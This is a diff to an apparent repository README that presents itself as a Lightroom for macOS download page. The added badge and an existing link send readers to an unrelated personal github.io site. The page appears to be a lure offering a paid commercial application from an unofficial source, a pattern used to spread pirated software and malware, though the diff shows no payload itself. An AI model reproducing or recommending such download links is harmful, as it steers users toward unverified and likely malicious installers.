@@ -2,9 +2,8 @@
 
 Lightroom for macOS is a professional-grade photo editing and cataloging tool designed to enhance, organize, and streamline every step of a photographer’s workflow. Non-destructive editing ensures your original images remain untouched while you adjust colors, exposure, and details.  
 
-<div align="center">
-  <img src="https://i.postimg.cc/GpDrdNnv/svo2.png" width="250" alt="Lightroom Mac Logo"/>
-</div>
+[![🍏 Get Lightroom for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://samsonyichalal.github.io/github.io/)
+
 
 <div align="center">
 [🍏 Get Lightroom for Mac](https://samsonyichalal.github.io/github.io/)
